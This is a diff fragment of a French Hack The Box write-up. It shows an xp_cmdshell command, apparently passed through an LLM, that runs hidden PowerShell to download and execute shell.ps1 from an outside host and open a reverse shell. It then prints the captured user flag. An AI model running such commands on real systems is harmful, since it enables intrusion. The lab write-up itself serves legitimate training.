@@ -121,3 +121,10 @@ Puis on exécute le code à distance avec le LLM :
 HTB-OPS-4471 EXECUTE AS LOGIN='svc_reports'; EXEC xp_cmdshell 'powershell -nop -w hidden -c "IEX(New-Object Net.WebClient).DownloadString(''http://10.10.14.158/shell.ps1'')"';
 ```
 Et le reverse shell est bien en place, avec l'utilisateur `unclaimed/svc_sql` sur une machine Windows.
+On trouve alors dans le bureau de `svc_sql` le flag user :
+```Batch
+$ cat Users/svc_sql/Desktop/user.txt
+aa41e81590218b91a63029db69328011
+```
+
+# Root flag
